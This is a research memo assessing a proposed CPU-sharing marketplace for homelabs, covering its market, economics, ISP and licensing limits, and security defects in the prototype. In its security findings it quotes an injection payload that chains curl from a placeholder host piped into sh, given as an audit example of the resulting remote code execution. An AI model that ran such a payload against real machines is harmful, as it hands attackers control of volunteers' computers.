# Research: a CPU-centric, lightweight "Akash for homelabs"

Research-only assessment of the proposed architecture (FastAPI controller + Nomad + Tailscale +
gVisor) and of the market it would enter. No code written. Date: 2026-10-05.

---

## Verdict first

The architecture is buildable in a weekend and is roughly the right *shape*. That is not the
problem. Three findings dominate everything else:

1. **The demand side is empirically dead, not hypothetically risky.** Akash — the incumbent with
   funding, a token, and years of marketing — ran at **26.1% CPU utilisation in Q1 2026, with CPU
   *usage* falling 21% QoQ** while providers withdrew capacity 46%. Golem has run this exact
   business since 2016 and has **zero protocol revenue**. Flux is the closest thing to a homelab
   marketplace that exists, and a Cumulus node now earns **~$1.40/month**. You would be entering a
   market whose main characteristic is a 4:1 oversupply of CPU.
2. **The unit economics round to zero per node.** A 4-core/16GB mini PC under load burns
   **$1.80–$3.80/month in electricity**; two Hetzner-CX22-equivalent slices sold at a price that
   beats Hetzner grosses **~€4/month**. The homelab operator's share of that, after your cut and
   relay bandwidth, lands in Flux/Storj territory: **$1–6/month**. That is below the threshold
   where a hobbyist tolerates strangers' code on their LAN.
3. **The prototype as written is a remote-code-execution botnet.** `docker run` is built by string
   interpolation and executed with `shell=True` from controller-supplied values, with **no
   authentication on the heartbeat endpoint**. Anyone who can reach `/api/v1/tenant/deploy` gets
   arbitrary shell on every volunteer's home machine. Details in §5 — this one is not a "harden it
   later" item.

There *is* a defensible business adjacent to this, and it is not CPU-by-the-core. See §7.

---

## 1. Who has already built this, and what happened

| Project | Shape | Outcome / current numbers |
|---|---|---|
| **Akash** | Container marketplace, K8s providers, reverse auction | CPU utilisation **26.1%** (Q1 2026), up only because providers *withdrew* 46% of capacity; CPU usage **−21% QoQ**, and **−37% in Q4 2025**. Pivoting to GPU. |
| **Golem** | P2P CPU marketplace since 2016 | **Zero protocol revenue** after ~10 years (0% commission by design). Diagnosis in the public write-ups is explicit: *"general CPU capacity is abundant and cheap from hyperscalers."* |
| **Flux** | Closest existing analogue to homelab compute | Cumulus tier (2 cores / 8 GB) earns **~0.69 FLUX/day ≈ $1.40/month** as of Apr 2026 — *less than a cheap VPS costs*, let alone the hardware. |
| **Fluence** | CPU-only "cloudless" marketplace — the one success | **>$1M ARR**, ~80% cheaper than hyperscalers. **But: enterprise-grade data-centre providers, not homelabs** — and in 2025 it added GPU because that is where the money went. |
| **Spheron "Fizz"** | Explicitly community/home devices | Min 4 CPU / 8 GB / 100 GB, rewards gated on ≥50% uptime per 24h ERA. Note what 50% implies about what they expect from home nodes. |
| **Salad** | Consumer PCs, non-crypto payouts | **Works**: 450k+ GPUs, $7M+ paid out. Sells GPU + *bandwidth*, pays via PayPal/gift cards, and ships **per-user workload consent controls** (incl. auto-blocking adult content by jurisdiction). |
| **Vast.ai** | Marketplace incl. home hosts | **Works**: solves trust with tiered verification — reliability score (0–1) from uptime/interruption history, ≥90% for verified status, datacenter-verified tier held separately. |
| **Storj** | Storage, not compute | **Works**, and still: average node earns **~$6/month**; the company explicitly tells people *not* to buy hardware for it — it only defrays existing cost. |

**Read of the table:** every project that works either (a) sells something other than generic CPU
(GPU, bandwidth, storage), or (b) sources from data centres rather than homes. The two that sold
generic CPU from commodity hardware are the two with no revenue.

The one genuinely new thing since those launches is that **Fluence proved $1M ARR exists for cheap
CPU with an SLA** — but it proved it by *not* using homelabs.

---

## 2. Unit economics — the arithmetic that decides this

### Price ceiling (what you can charge)
- **Hetzner CX22** — 2 vCPU / 4 GB / 40 GB / **20 TB traffic**: **€3.79–3.99/month** (raised ~33%
  in April 2026 on DRAM/NVMe costs). This is your competitor's list price, with a real SLA, a
  public IPv4, and an API.
- **Akash market rate** — 4 vCPU / 16 GB: **$15–30/month** (vs ~$120 AWS). Note this is the
  *asking* price in a market clearing at 26% utilisation, so realised revenue is ~26% of it.

To win a customer who is giving up an SLA, a static IP, and predictable neighbours, you need to be
*materially* cheaper than €4/month for a 2-vCPU slice. Call it €2.

### Cost floor (what the provider pays)
- **Intel N100 mini PC** (4 cores / up to 16 GB): idle **~6–12 W**, full load **14–18 W**.
- 15 W × 24 × 30 = **10.8 kWh/month** → **$1.84** at US average (~$0.17/kWh), **£2.78** at UK
  2025 rates (£0.2573/kWh), **~€3.80** at German retail.
- Anything rack-mounted is immediately fatal: a **250 W server ≈ $30/month, $360/year**.

### Putting it together, per node, per month
```
Node: N100, 4 cores / 16 GB. Sellable: ~2 × (2 vCPU/4 GB) slices.
Gross at a price that beats Hetzner:        2 × €2.00   =  €4.00
Less electricity (15 W, EU rates):                      − €3.80
                                                        ────────
Provider margin before your platform cut:                  €0.20
```
At US electricity and 100% occupancy you get to roughly **€2/month** of margin for the whole box.
Then subtract your platform's take, relay bandwidth, and the fact that occupancy will be nowhere
near 100% — Akash's is 26%.

This is not a modelling artefact. It is exactly where Flux ($1.40) and Storj ($6) actually landed.

### The hidden cost nobody budgets: egress
Hetzner bundles **20 TB** of traffic into that €3.99. You cannot. Behind CGNAT (common and
growing on residential ISPs, usually symmetric NAT, i.e. NAT444 with two layers to traverse),
inbound traffic has to come through **your** relay — so tenant bandwidth is a cost on your
balance sheet, metered, while your competitor gives it away. Residential upload is also
asymmetric, so a node advertising 8 cores may still be useless for anything serving traffic.

### The one asset homelabs have that data centres do not
**Residential IP addresses.** The market rate for residential egress is **$1–10/GB** (DataImpulse
~$1, IPRoyal ~$1.75, Oxylabs $2.50–6, Bright Data ~$4–8). That is 100–1000× the value density of
the CPU cycles on the same box. If a homelab network has a defensible product, it is *location and
IP reputation*, not cores.

That is also the direction that gets you adjacent to residential-proxy abuse (the Aisuru botnet
pivoted from DDoS to exactly this market), so it demands explicit consent, KYC, and a hard AUP —
Salad's workload-preferences model is the honest version of it.

---

## 3. Legal / trust constraints that bite before the tech does

**Your supply base is, by contract, not allowed to do this.**
- **Comcast/Xfinity AUP**: prohibits "dedicated, stand-alone equipment or servers … that provide
  network content or services to anyone outside of your local area network" — naming web hosting,
  file sharing and proxy services — *and* restricts service to "personal and non-commercial
  residential use only".
- **Verizon**: may not "use the service to host any type of server". **AT&T**: prohibits
  "operating a server of any type".
This does not mean nobody does it. It means the terms under which you recruit providers must say
out loud that they may be violating their ISP contract, and your capacity can evaporate on an ISP
enforcement sweep.

**Abuse liability lands on a volunteer earning $3/month.** Tenant workloads mean cryptomining
(sustained 100% CPU, persistent pool connections, near-zero disk I/O — detectable, and the
single most common abuse of any free/cheap compute tier), spam, credential stuffing, DDoS, and
illegal content — all egressing from a *named individual's home IP*. The consequences (ISP
termination, blocklisting, a police inquiry) are borne by the provider, not by you. DePIN projects
that have confronted this ended up **treating providers as licensed operators with KYC and
deactivation powers** — which dissolves most of the "permissionless" premise.

**Enterprise buyers cannot purchase this at all.** Data residency, SOC 2 audit access and
enforceable SLAs are structural blockers, not paperwork — ~90% of surveyed enterprise buyers rate
near-100% uptime as important/highly important. Akash's own documented gap is that it has **no SLA
or SLO mechanism, so tenants cannot distinguish a homelab from a tier-3 data centre**. Your
addressable market is therefore hobbyists and side projects — the segment with the lowest
willingness to pay and the highest support burden.

**Paying people is its own compliance project.** Via Stripe Connect: tax info must be collected
and verified at **$600** in charges or payouts are frozen; **1099-K** at >$20,000 *and* >200
transactions for 2026. Fiat payouts to individuals across jurisdictions is a real back office.
(The usual escape hatch — pay in a token — is precisely what gave Golem a provider base whose
income is a currency bet while its costs are in local-currency electricity.)

---

## 4. Fact-checking the proposed stack

| Claim in the proposal | Finding |
|---|---|
| "Kubernetes eats 2–4 GB RAM sitting idle" | **Overstated for the relevant comparison.** Full upstream K8s, yes (~1.5–2 GB). But **k3s agent: 268–275 MB** (official profiling, Pi4B / Xeon); k3s server+agent ~1.4 GB. |
| "Nomad uses ~30–50 MB on a provider node" | **Broadly correct** — ~30 MB for the agent; one edge comparison measured 58 MB/device vs ~430 MB for minimal k3s. So the delta is real, just ~270 MB rather than ~4 GB. |
| "Use Nomad" | **Licensing problem.** Nomad CE is **BUSL 1.1**, not open source, since Aug 2023; HashiCorp is **IBM-owned since 27 Feb 2025**. BUSL bars using it to provide a "competitive offering … that significantly overlaps the capabilities of a HashiCorp commercial product", and explicitly covers **embedding or hosting**. A paid multi-tenant scheduling service is close enough to that line to need a lawyer, not a blog post. Each release converts to the old licence 4 years after shipping. **There is no OpenTofu-style fork to fall back to.** |
| "Tailscale/Headscale mesh" | **Tailscale's ToS prohibits "selling, reselling, renting or leasing use of the Services"** — commercial resale requires their Channel Partner Agreement. And **Headscale is explicitly a single-tailnet design** with no dynamic ACLs, no Funnel; multi-tenant means one instance per tenant. A single flat tailnet across all providers and tenants is also an architectural mistake: it gives every participant L3 reachability to every other participant. |
| "gVisor stops tenant root from touching the host kernel" | **Directionally true, and the right instinct** — `runc` is not a security boundary (CVE-2024-21626 "Leaky Vessels": fd leak → host filesystem escape; explicitly worse in multi-tenant clusters sharing nodes). But the commonly-quoted gVisor penalties are stale: **ptrace was replaced as default by systrap in mid-2023** and is unsupported. Real figures: syscalls **~2.2× slower** (800 ns vs 70 ns), network throughput **−20–40%**, I/O-heavy workloads 10–30% slower — yet at Ant Group's scale **70% of applications saw <1% overhead, 95% under 3%**. On bare metal the **KVM platform** is faster than systrap. |
| "Traefik/Caddy at the centre, Cloudflare for ingress" | The widely-repeated **Cloudflare ToS §2.8 non-HTML restriction no longer exists** — it was removed and replaced with CDN-specific service terms requiring large media to be hosted on Cloudflare services. So that specific objection is outdated, but reselling/proxying arbitrary tenant traffic still needs a terms review. |
| Implied: Docker's default network is fine | **The most under-appreciated risk.** A container on the default bridge can reach the provider's **home LAN** — NAS, router admin, cameras, IoT. gVisor does nothing about this; it is a network-policy problem requiring RFC1918 egress blocking per workload. |

### Alternatives worth considering instead
- **k3s** (Apache 2.0) — 270 MB is affordable, and you inherit NetworkPolicy, RuntimeClass
  (`runsc`), resource quotas and an ecosystem rather than writing them.
- **Bacalhau** (Apache 2.0) — single self-contained binary acting as orchestrator *or* compute
  node, designed for **compute nodes with intermittent connectivity to the orchestrator** across
  regions and providers. This is closer to your actual problem than Nomad is.
- **Firecracker** — ~125 ms boot, ~5 MB overhead, hardware-enforced isolation; needs direct KVM,
  which a bare-metal mini PC has. **Blacksmith sells GitHub Actions runners on exactly this
  (bare-metal consumer CPUs + Firecracker microVMs)** — strong evidence this is the right
  isolation choice for genuinely adversarial tenants.
- **Mesh**: **NetBird** (BSD-3 client / AGPL control plane, fully self-hostable *with* dashboard,
  group-based policies, SSO) or **Nebula** (MIT, certificate-based, built-in host firewall, no
  SaaS dependency). Both beat Headscale for a multi-tenant commercial deployment.

---

## 5. Defects in the prototype as written

Security, in rough severity order:

1. **Remote code execution on every provider node.**
   `run_cmd = f"docker run -d --name {dep_id} --restart unless-stopped {image}"` executed with
   `subprocess.run(..., shell=True)`. `image` and `deployment_id` come from an unauthenticated
   HTTP endpoint. `{"image": "nginx; curl http://evil/x.sh | sh"}` is game over on every
   participating machine. **The agent is a C2 client by construction**, even after you fix the
   quoting — the design grants the controller arbitrary execution on volunteers' hardware.
2. **No authentication anywhere.** `ProviderRegisterSchema` has no token field; the agent never
   sends one (`PROVIDER_SECRET` exists in the first draft and is never checked). Consequences:
   anyone can register fake capacity; anyone can **impersonate a `provider_id` and receive another
   node's `assigned_jobs`**, i.e. steal tenant job definitions; anyone can deploy. No TLS, no
   rate limiting, no tenant identity at all.
3. **Tenant-chosen `deployment_id` is the primary key.** `deployments[req.deployment_id] = {...}`
   lets one tenant silently overwrite another tenant's lease record, and collides in Docker's
   namespace across nodes.
4. **Containers have no resource limits.** No `--cpus`, `--memory`, `--pids-limit`, `--read-only`,
   `--cap-drop`, no `--network` isolation, and **no `--runtime=runsc`** despite gVisor being the
   stated plan. The scheduler's accounting is therefore fiction: nothing stops one tenant from
   consuming the whole machine, and nothing stops a container reaching the home LAN (§4).
5. **`--restart unless-stopped` with no reaper.** Tenant containers outlive the agent, the lease
   and the controller. There is no stop/delete path at all, so capacity leaks permanently.

Correctness:

6. `psutil.util.platform.machine()` — **does not exist**; `psutil.util` is not a public attribute.
   `platform.machine()` is what was meant (the second draft gets this right).
7. **Schema mismatch between the two drafts**: the agent reports `cores` / `ram_gb`; the first
   scheduler reads `host["available_cores"]` / `host["available_ram"]` → `KeyError`.
8. `requests.post(API_URL, ...)` posts to the **site root**, not to the heartbeat path.
9. **State is in-memory dicts.** A controller restart silently frees every lease while the
   containers keep running — permanent drift between billing records and reality.
10. **`deployments` is never pruned**, so `allocated_cores` grows monotonically and nodes become
    unschedulable forever. Dead nodes' deployments still count against them.
11. **`docker ps -f name=X` is a substring match**, so deployment `web` reports `web-01` as
    already running and the job is silently skipped.
12. **The scoring function adds cores to gigabytes** (`cpu_score + ram_score`), asserting 1 core
    == 1 GB. And the comments contradict themselves: ascending sort on leftover capacity is
    **best-fit (packing)**, but the prose says it "spreads the load gently across the homelab
    network", which is the opposite (worst-fit). Decide which you want — packing maximises the
    number of idle nodes you can let sleep; spreading minimises noisy-neighbour contention.
13. No heartbeat timeout reconciliation (a 30 s liveness window with a 60 s report interval in the
    first draft means nodes flap permanently), no job status reporting back from the agent, no
    retry/backoff, no idempotency key.

---

## 6. What the proposal gets right

Worth keeping, because it is genuinely the correct instinct:
- **Not Kubernetes on the provider side.** A single static binary agent is the right shape for
  old laptops and Pis, and matches what Bacalhau and Vast.ai actually do.
- **Not a crypto-economic layer.** Golem's own retrospective and Flux's reward collapse are the
  argument; Salad's PayPal/gift-card payouts are the proof that fiat works better.
- **Mesh overlay instead of asking providers to port-forward.** Correct, and non-negotiable given
  CGNAT.
- **Kernel-level sandboxing as a hard requirement, not an option.** Correct, and the Leaky Vessels
  class of bug is the justification.
- **A central reverse proxy with workload registration.** This is how you make CGNAT'd nodes
  serve traffic at all.

---

## 7. Where I would actually point this effort

Ranked by probability of a real user, descending.

**A. Federated homelab orchestration with no marketplace** (strongest fit for the stated
community). Same stack — agent + mesh + scheduler + ingress — but the trust boundary is
"people who already know each other": a club, a Discord, a university group, friends pooling three
mini PCs. This deletes the entire economics problem, the ISP-AUP problem, the abuse-liability
problem and the KYC problem at once, and leaves a genuinely wanted product: *k3s/Nomad was too
heavy, I have four boxes in two houses and want one place to deploy things*. No one has nailed
this UX.

**B. Sell the thing that is actually scarce.** Homelabs' unique assets are residential IPs, real
last-mile conditions and physical geography — not cores. Legitimate, non-abusive products on that
asset: geo-distributed synthetic monitoring and uptime checks, CDN/DNS propagation and last-mile
latency measurement, regional content/ad verification, IPv6/CGNAT reachability testing. Priced per
check rather than per core-hour, the value density is 100× better, the workloads are tiny and
short-lived (so sandboxing and noisy neighbours get much easier), and nothing untrusted needs root
on a volunteer's box.

**C. Narrow, high-value CPU niche instead of generic vCPU.** Where cheap CPU demonstrably sells:
**CI runners on bare metal** (Blacksmith, Tenki, RunsOn, Ubicloud all competing on exactly "bare
metal consumer CPUs beat cloud vCPU per dollar"), game/Minecraft servers, and build/cache farms.
These buyers want single-core speed and fast disks — which is precisely what a desktop-class
homelab box has and a shared cloud vCPU does not. Bursty, stateless, checkpointable, and
failure-tolerant: a node vanishing costs a retry, not an incident.

**D. If you still want the marketplace**, the non-negotiables from the evidence:
- **Rent whole nodes, not slices** (Vast.ai's model). Single-tenant-per-box kills noisy
  neighbours, makes accounting honest and reduces the sandbox to "protect the host and the LAN".
- **Tiered verification with a reliability score** from measured uptime/interruption history, and
  a separate verified tier — tenants must be able to tell a gaming rig from a rack.
- **Firecracker on bare metal** (KVM is available on any mini PC) rather than gVisor, if tenants
  are adversarial; gVisor only where KVM isn't.
- **Per-tenant network namespace, not one flat tailnet**, plus mandatory RFC1918 egress blocking.
- **Fiat payouts + KYC + explicit workload-consent toggles** (Salad's model), and an AUP with
  real enforcement and egress-pattern abuse detection from day one.
- **Explicit SLO tiers**, because the absence of them is Akash's documented weakness.

---

## 8. What to validate before writing more code

The expensive question is demand, and it costs nothing to test:
1. Find **20 people who would pay** for a 2 vCPU/4 GB box with no SLA. Ask what they pay now and
   what would make them switch. If the answer is "it would have to be free", stop.
2. Ask **20 homelab operators** whether they would run strangers' containers for **$2/month**,
   with the ISP-AUP and abuse-liability facts disclosed up front. Flux's $1.40 and Storj's $6 are
   your priors.
3. Measure one real node: actual idle/load watts, actual upload throughput, whether the ISP
   CGNATs it. Three data points decide whether any of this clears electricity.
4. Resolve the **Nomad BUSL** question before building on it — or sidestep it with k3s or
   Bacalhau, both Apache 2.0.

---

## Sources

Prior art and market data: [Akash Q1 2026](https://messari.io/report/state-of-akash-q1-2026-final) ·
[Akash Q4 2025](https://messari.io/report/state-of-akash-q4-2025) ·
[Akash Q2 2025](https://messari.io/report/state-of-akash-q2-2025) ·
[Akash stats](https://stats.akash.network/) ·
[Golem review/retrospective](https://ownyourmind.ai/projects/golem/) ·
[FluxNode operator guide 2026](https://www.depinrun.com/guides/fluxnode-operator-guide) ·
[Flux node tiers](https://docs.runonflux.com/fluxnodes/what-are-fluxnodes/) ·
[Fluence 2025 recap](https://www.fluence.network/blog/fluence-2025-year-end-recap/) ·
[Fluence](https://fluence.ai/) ·
[Spheron Fizz nodes](https://docs.spheron.network/core-concepts/fizz) ·
[Salad about](https://salad.com/about) ·
[Salad workload preferences](https://support.salad.com/guides/getting-jobs/workload-preferences/) ·
[Vast.ai verification stages](https://docs.vast.ai/host/verification-stages) ·
[Storj earnings](https://www.storj.io/blog/sharing-storage-space-for-fun-and-profit/) ·
[Storj operator thread](https://forum.storj.io/t/is-earning-with-storj-worth-it-my-3-month-test-results-and-insights/28720)

Economics: [Hetzner CX22](https://vpsbenchmarks.com/hosters/hetzner/plans/cx22) ·
[Hetzner 2026 pricing](https://bestusavps.com/reviews/hetzner/) ·
[Akash vs AWS pricing](https://www.masternodeai.com/en/infrastructure/akash-network-vs-centralized-cloud-real-cost-analysis-2026) ·
[Mini PC power cost 24/7](https://www.starryhope.com/minipcs/mini-pc-power-cost-24-7-2026/) ·
[N100 power measurements](https://www.linuxlinks.com/dreamquest-n100-mini-pc-running-linux-power-consumption/4/) ·
[Self-hosting isn't free](https://tech.yahoo.com/computing/articles/self-hosting-isn-t-free-153015638.html) ·
[Residential proxy pricing](https://dataimpulse.com/blog/residential-proxy-pricing-comparison/) ·
[Proxy pricing index 2026](https://proxidize.com/research/proxy-pricing-index-2026/)

Legal / trust: [Comcast AUP](https://www.xfinity.com/corporate/customers/policies/highspeedinternetaup) ·
[Xfinity residential AUP (PDF)](https://assets.xfinity.com/assets/dotcom/learn/Files/FEDCM-MIG/Batch-2/PDF/pages/Corporate/Customers/Policies/HighSpeedInternetAUP/Xfinity_Internet_AUP_Residential_ENG_02012021.pdf) ·
[Microsoft on cryptojacking abuse](https://www.microsoft.com/en-us/security/blog/2023/07/25/cryptojacking-understanding-and-defending-against-cloud-compute-resource-abuse/) ·
[Residential proxy abuse (Krebs)](https://krebsonsecurity.com/2025/10/aisuru-botnet-shifts-from-ddos-to-residential-proxies/) ·
[DePIN enterprise barriers](https://coincub.com/blog/depin-ai/) ·
[Akash: should I run a provider](https://akash.network/docs/providers/getting-started/should-i-run-a-provider/) ·
[Akash provider fee drain](https://github.com/akash-network/support/issues/180) ·
[Stripe Connect 1099](https://stripe.com/connect/1099) ·
[Stripe tax info collection](https://support.stripe.com/questions/how-do-i-ensure-i-m-collecting-tax-reporting-information-for-my-connected-accounts)

Stack: [k3s resource profiling](https://docs.k3s.io/reference/resource-profiling) ·
[k3s idle memory discussion](https://github.com/k3s-io/k3s/discussions/3558) ·
[Nomad CE licence](https://github.com/hashicorp/nomad/blob/main/LICENSE) ·
[HashiCorp licence FAQ](https://www.hashicorp.com/en/license-faq) ·
[HashiCorp BUSL announcement](https://www.hashicorp.com/en/blog/hashicorp-adopts-business-source-license) ·
[IBM closes HashiCorp deal](https://techcrunch.com/2025/02/27/ibm-closes-6-4b-hashicorp-acquisition/) ·
[Tailscale ToS](https://tailscale.com/terms) ·
[Tailscale channel partner agreement](https://github.com/tailscale/terms-and-conditions/blob/main/channel-partner-agreement/index.md) ·
[Headscale vs Tailscale](https://dev.to/selfhostingsh/headscale-vs-tailscale-self-hosted-control-plane-1h1f) ·
[NetBird/Nebula/ZeroTier licensing](https://dev.to/moksh/self-hosted-vpn-in-2026-wireguard-headscale-netbird-and-more-compared-5fln) ·
[gVisor systrap release](https://gvisor.dev/blog/2023/04/28/systrap-release/) ·
[gVisor platform guide](https://gvisor.dev/docs/architecture_guide/platforms/) ·
[gVisor at Ant scale](https://gvisor.dev/blog/2021/12/02/running-gvisor-in-production-at-scale-in-ant/) ·
[True cost of containing (USENIX)](https://www.usenix.org/system/files/hotcloud19-paper-young.pdf) ·
[Firecracker vs gVisor](https://fly.io/learn/firecracker-vs-gvisor/) ·
[Leaky Vessels CVE-2024-21626](https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities) ·
[Bacalhau](https://github.com/bacalhau-project/bacalhau) ·
[Cloudflare ToS §2.8 removal](https://www.engineering.fyi/article/goodbye-section-2-8-and-hello-to-cloudflare-s-new-terms-of-service) ·
[CGNAT](https://en.wikipedia.org/wiki/Carrier-grade_NAT) ·
[Blacksmith bare-metal CI](https://info.blacksmith.sh/task/blog/ci-runner-services-bare-metal-performance-github-actions)
